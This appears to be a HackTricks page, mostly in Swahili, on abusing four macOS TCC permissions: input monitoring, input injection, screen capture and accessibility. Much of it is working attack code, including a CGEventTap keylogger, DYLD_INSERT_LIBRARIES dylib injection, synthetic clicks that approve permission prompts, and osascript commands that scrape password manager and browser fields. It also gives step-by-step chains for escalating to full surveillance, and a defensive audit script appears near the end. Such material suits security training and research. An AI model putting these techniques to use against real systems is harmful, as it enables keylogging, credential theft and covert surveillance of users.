# macOS Ufuatiliaji wa Ingizo, Upigaji Picha wa Skrini & Matumizi Mabaya ya Ufikivu

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Huduma tatu zinazohusiana za TCC zinadhibiti jinsi applications zinaweza kuangalia na kuingiliana na kikao cha desktop cha mtumiaji:

| TCC Service | Permission | Capability |
|---|---|---|
| `kTCCServiceListenEvent` | **Ufuatiliaji wa Ingizo** | Soma matukio yote ya kibodi na panya kote kwenye mfumo (keylogging) |
| `kTCCServicePostEvent` | **Uingizaji wa Ingizo** | Ingiza matukio bandia ya kibodi na panya |
| `kTCCServiceScreenCapture` | **Upigaji Picha wa Skrini** | Soma buffer ya display, chukua screenshots, rekodi skrini |
| `kTCCServiceAccessibility` | **Ufikivu** | Dhibiti applications nyingine kupitia AXUIElement API, soma vipengele vya UI |

Ruhusa hizi ndizo **mchanganyiko hatari zaidi** kwenye macOS — pamoja zinatoa:
- Keylogging kamili ya kila kubonyeza (passwords, ujumbe, namba za kadi)
- Rekodi ya skrini ya maudhui yote yanayoonekana
- Uingizaji wa ingizo wa synthetic (bonyeza vitufe, thibitisha madirisha ya dialog)
- Udhibiti kamili wa GUI sawa na kupata kifaa kwa mwili

---

## Input Monitoring (kTCCServiceListenEvent)

### Jinsi Inavyofanya Kazi

macOS inatumia **`CGEventTap` API** kuwezesha michakato kukamata matukio ya ingizo kutoka kwenye Quartz event system. Mchakato wenye ruhusa ya ListenEvent anaweza kuunda event tap inayopokea **kila tukio la kibodi na panya** kabla au baada ya kufika kwenye application lengwa.
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Kupata Entitled Binaries
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Shambulio: Keylogging via Code Injection

Ikiwa binary yenye ruhusa ya ListenEvent pia ina **disabled library validation** au **allows DYLD environment variables**, mshambuliaji anaweza kuingiza dylib inayosajili CGEventTap:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
dylib iliyopachikwa inaurithi ruhusa ya ListenEvent TCC ya lengo na huchukua vibonyezo vyote vya kibodi.

### Attack: Credential Harvesting

keylogger iliyobobea inaweza kuhusisha vibonyezo vya kibodi na programu inayotumika:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### Jinsi Inavyofanya Kazi

Ruhusa ya PostEvent inaruhusu kuunda event tap na **`kCGEventTapOptionDefault`** (inaweza kubadilisha/kuingiza matukio) badala ya ListenOnly. Hii inaruhusu:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Attack: Automated TCC Prompt Approval

Kwa PostEvent, mshambulizi anaweza **kuiga kubonyeza "Allow"** kwenye madirisha ya ruhusa za TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Kunyakua Skrini (kTCCServiceScreenCapture)

### Jinsi Inavyofanya Kazi

Ruhusa ya kunyakua skrini inaruhusu kusoma buffer ya onyesho kwa kutumia:
- **`CGWindowListCreateImage`** — kunyakua dirisha lolote au skrini nzima
- **`ScreenCaptureKit`** (macOS 12.3+) — API ya kisasa kwa ajili ya kutiririsha maudhui ya skrini
- **`CGDisplayStream`** — kunyakua skrini kwa msaada wa vifaa
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Kupata wateja wa kunasa skrini
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

Mchakato wa kunasa skrini uliyoingizwa unaweza mara kwa mara kukamata fremu na kutumia OCR kutoa nywila:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Kuanzia na **macOS Sonoma**, kunasa skrini kunakuwa na **kiashiria kinachodumu** kwenye bar ya menyu. Katika matoleo ya zamani, urekodi wa skrini ungeweza kuwa kimya kabisa. Hata hivyo, kunasa kwa fremu moja kwa muda mfupi bado kunaweza kupita bila kutambuliwa na watumiaji.

### Attack: Session Recording

Urekodi wa skrini unaoendelea hutoa urejeshaji kamili wa kikao cha mtumiaji:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Ufikiaji wa Accessibility (kTCCServiceAccessibility)

### Jinsi Inavyofanya Kazi

Ufikiaji wa Accessibility unatoa udhibiti wa programu nyingine kupitia **AXUIElement API**. Mchakato wenye ufikiaji unaweza:

1. **Soma** kipengee chochote cha UI katika programu yoyote (uwanja wa maandishi, lebo, vitufe, menyu)
2. **Bofya** vitufe na kuingiliana na vidhibiti
3. **Andika** maandishi katika sehemu yoyote ya maandishi
4. **Pitia** menyu na madirisha ya mazungumzo
5. **Kukusanya** data inayoonyeshwa kutoka kwa programu yoyote inayoendesha
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

Unyanyasaji wa accessibility hatari zaidi ni **kuvinjari System Settings na kumpa malware yako ruhusa za ziada**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Shambulio: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Shambulio: Vitendo vya Mtumiaji Vilivyofanywa Kiotomatiki
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Mnyororo wa Mashambulizi

### Mnyororo: Input Monitoring + Screen Capture = Ufuatiliaji wa Kamilifu
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Mnyororo: Accessibility + PostEvent = Udhibiti wa mbali kamili
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Mnyororo: Ufikiaji → Kujiruhusu Kamera/Mikrofoni → Ufuatiliaji
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Utambuzi & Uorodheshaji
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Marejeo

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
